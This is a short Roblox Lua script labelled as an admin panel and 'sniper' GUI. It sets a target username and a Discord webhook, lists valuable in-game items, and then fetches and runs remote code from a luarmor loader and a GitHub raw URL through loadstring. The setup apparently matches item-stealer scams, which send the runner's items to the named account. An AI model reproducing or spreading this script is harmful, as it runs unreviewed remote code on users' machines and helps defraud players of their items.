-- Mode: ADMINPANEL
getgenv().TARGET_USERNAME = "joaopedro191253"
getgenv().WEBHOOK_URL = "https://discord.com/channels/1482213312249987104/1527591255029321759"
getgenv().NORMAL_BRAINROTS = {
    ["Dragon Skeletonini"] = true,
    ["Flying Dutchman"] = true,
    ["Boo Boo Rocket"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Examen Bros"] = true,
    ["Los Admins"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Los Tictacs"] = true,
    ["Los Tangcitos"] = true,
    ["Bufalino Boomberino"] = true,
    ["Esok Goala"] = true,
    ["Capitano Americano"] = true,
    ["4th Bros"] = true,
    ["Ventoliero Pavonero"] = true,
    ["W or L"] = true,
    ["Triplito Tralaleritos"] = true,
    ["Tuff Toucan"] = true,
    ["Vulturino Skeletono"] = true,
    ["Zombie Tralala"] = true,
    ["Yess my examine"] = true,
    ["Venuspino"] = true,
    ["Tralaledon"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tictac Sahur"] = true,
    ["Tacorillo Crocodillo"] = true,
    ["Swag Soda"] = true,
    ["Swaggy Bros"] = true,
    ["Steakini Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Globa Steppa"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Guest 666"] = true,
    ["Dragon Gingerini"] = true,
    ["Dragon Aquanini"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dug dug dug"] = true,
    ["Duggy Bros"] = true
}
getgenv().NORMAL_BASE_SKINS = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Tralalero"] = true,
    ["Bee Emperor"] = true,
    ["Honey Bee"] = true
}
getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Lava Blaster"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true,
    ["Phantom Slap"] = true,
    ["Flying Bee"] = true,
    ["Crystal Slap"] = true,
    ["Candy Slap"] = true,
    ["Crystal Hammer"] = true
}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)